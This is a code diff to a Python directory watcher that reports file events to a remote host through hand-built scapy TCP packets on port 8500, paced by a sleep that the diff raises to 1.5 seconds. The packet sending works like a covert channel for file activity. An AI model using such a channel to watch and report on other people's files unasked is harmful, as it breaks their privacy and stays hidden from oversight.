@@ -22,14 +22,14 @@ class EventHandler(pyinotify.ProcessEvent):
 
         self.send_notif("Deleted", event.pathname)
 
-    def process_IN_MODIFY(self, event):
-        if event.dir == True:
-            return
+    # def process_IN_MODIFY(self, event):
+    #     if event.dir == True:
+    #         return
         
-        if "swp" in event.name or ".part" in event.name or event.name[-1] == "+" or event.name[-1] == "-" or ".lock" in event.name or "." in event.name:
-            return
+    #     if "swp" in event.name or ".part" in event.name or event.name[-1] == "+" or event.name[-1] == "-" or ".lock" in event.name or "." in event.name:
+    #         return
 
-        self.send_notif("Modified", event.pathname)
+    #     self.send_notif("Modified", event.pathname)
 
     def process_IN_CLOSE_WRITE(self, event):
         if "swp" in event.name or ".part" in event.name or event.name[-1] == "+" or event.name[-1] == "-" or ".lock" in event.name or "." in event.name:
@@ -74,7 +74,7 @@ class EventHandler(pyinotify.ProcessEvent):
             pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/chunk
 
             send(pkt, verbose=False)
-            time.sleep(1)
+            time.sleep(1.5)
 
 
 def start_watchdir(dirname, host_ip):
